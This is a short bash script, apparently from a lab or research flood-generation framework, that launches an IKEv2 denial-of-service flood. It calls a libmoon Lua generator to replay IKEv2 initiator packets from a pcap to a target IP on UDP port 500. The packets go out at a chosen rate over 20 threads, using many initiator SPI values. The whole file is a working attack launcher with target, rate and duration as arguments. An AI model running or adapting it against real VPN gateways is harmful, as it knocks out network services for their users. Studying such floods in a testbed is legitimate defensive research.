#!/bin/bash

# sudo script.sh <ipSrc> <ipDst> <attackRate> <duration>
# e.g.
# sudo bash ikev2Flood.sh 172.31.116.132 172.31.116.137 1000 10 ikev2_cisco.pcap 1000000 128

# cd to directory of script
scriptDir=$(dirname -- "$(readlink -f -- "$BASH_SOURCE")")
cd "$scriptDir"

# prepare Flood Generator framework
source ../prepFloodGenerator.sh

############## Flood Configuration ##############

ipSrc=$1
ipDst=$2
attackRate=$3
seconds=$4

pcap=$5
initSPINumber=$6 # number of initiator SPI numbers to be used in the attack
flows=${7:-1} #default value 1

# more fixed configuration values (adjust if needed)
ethSrc="3c:fd:fe:9e:8e:39"
udpSrc=500

ethDst="b0:aa:77:2f:ab:1a"
udpDst=500


############## Flood Start ##############

$libmoonBuild/libmoon ikev2Flood.lua \
    --seconds $seconds --threads 20 --rate $attackRate \
    --replayInit $pcap \
    --initSPINumber $initSPINumber --ipFlows $flows \
    --ethSrc $ethSrc --ip4Src $ipSrc --udpSrc $udpSrc \
    --ethDst $ethDst --ip4Dst $ipDst --udpDst $udpDst \
    --startConfirmation \
    0